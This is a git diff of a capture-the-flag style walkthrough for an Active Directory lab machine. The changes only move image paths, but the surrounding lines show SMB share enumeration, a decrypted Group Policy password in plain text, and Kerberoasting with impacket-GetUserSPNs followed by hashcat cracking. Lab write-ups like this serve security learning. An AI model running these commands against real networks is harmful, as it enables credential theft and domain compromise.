@@ -21,20 +21,20 @@ Scan the machine's open ports and find an smb server. Locate the smbshares using
 
 ### Scan the machine for open ports
 
-![alt text](image.png)
+![alt text](images/image.png)
 
 ### Scan the open ports
 
-![alt text](image-1.png)
+![alt text](images/image-1.png)
 
 Find smbclient on port 445  
 List the available shares
-![alt text](image-2.png)
+![alt text](images/image-2.png)
 
 Use smbclient to access the Replication share
 `smbclient \\\\<IP>\\<SHARE>`  
 Find a Groups.xml file that contains a username and password
-![alt text](image-3.png)
+![alt text](images/image-3.png)
 
 Decrypt the password found in the groups.xml file
 
@@ -45,14 +45,14 @@ SCV_TGS : GPPstillStandingStrong2k18
 
 Use SMBMap to check for the shares svc_tgs has access to  
 `smbmap -u svc_tgs -p 'GPPstillStandingStrong2k18' -H 10.129.231.79`
-![alt text](image-5.png)
+![alt text](images/image-5.png)
 
 Use the decrypted password to get access to the USERS smb share  
 `smbclient -U 'svc_tgs%<PASSWORD>' \\\\10.129.231.79\\USERS`
-![alt text](image-4.png)
+![alt text](images/image-4.png)
 
 Get all the users in the AD Instance
-![alt text](image-6.png)
+![alt text](images/image-6.png)
 
 The administrator user is configured using a Service Principal Name on this Active Directory Instance
 
@@ -63,7 +63,7 @@ The administrator user is configured using a Service Principal Name on this Acti
 - `serviceprincipalname` -> requests only the servicePrincipalName attribute
 - `grep -B 1 servicePrincipalName` -> Shows the service principal name along with the line before it (distinguished name)
 
-![what goes here](image-7.png)
+![what goes here](images/image-7.png)
 
 Get the SPN using impacket's GetUserSPNs tool
 
@@ -74,11 +74,11 @@ impacket-GetUserSPNs active.htb/svc_tgs -dc-ip 10.129.231.79
 impacket-GetUserSPNs active.htb/svc_tgs -dc-ip 10.129.231.79 --request
 ```
 
-![alt text](image-8.png)
+![alt text](images/image-8.png)
 
 ### Take the hash and crack it locally
 
-![alt text](image-9.png)
+![alt text](images/image-9.png)
 
 ```
 hashcat -m 13100 spn.hash /rockyou.txt
